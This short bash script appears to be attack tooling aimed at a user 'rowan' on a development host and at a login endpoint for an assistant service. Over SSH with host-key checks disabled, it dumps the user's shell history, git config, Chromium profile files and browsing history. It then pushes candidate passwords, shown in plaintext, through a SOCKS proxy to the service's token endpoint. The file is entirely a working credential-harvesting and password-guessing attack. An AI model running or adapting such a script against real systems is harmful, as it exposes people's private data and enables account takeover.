#!/bin/bash
SSH="ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 -p 2222 rowan@rowan-dev"
echo "== rowan artifacts"
$SSH 'echo "--bash_history"; cat ~/.bash_history; echo "--gitconfig"; cat ~/.gitconfig; echo "--chromium"; find ~/.config/chromium -maxdepth 3 -type f 2>/dev/null | head -40; echo "--history grep"; strings ~/.config/chromium/Default/History 2>/dev/null | grep -i "assistant\|keplerops" | head -20' 2>&1 | grep -v Warning
P="--socks5-hostname 127.0.0.1:1080"; K="-k -sS -m 30"; H="https://assistant.keplerops.test"
echo "== assistant login rowan"
for pw in fieldlink-dev-2841 'lobf9Jt0SBW433in6wUVlkixnQreh5K-Z1LjbTofrqY'; do
 echo "-- pw=$pw"
 curl $K $P -X POST $H/api/request-token -H 'Content-Type: application/json' \
  -d "{\"username\":\"rowan.ito\",\"password\":\"$pw\"}" -w "\n[%{http_code}]\n" | head -c 600; echo
done
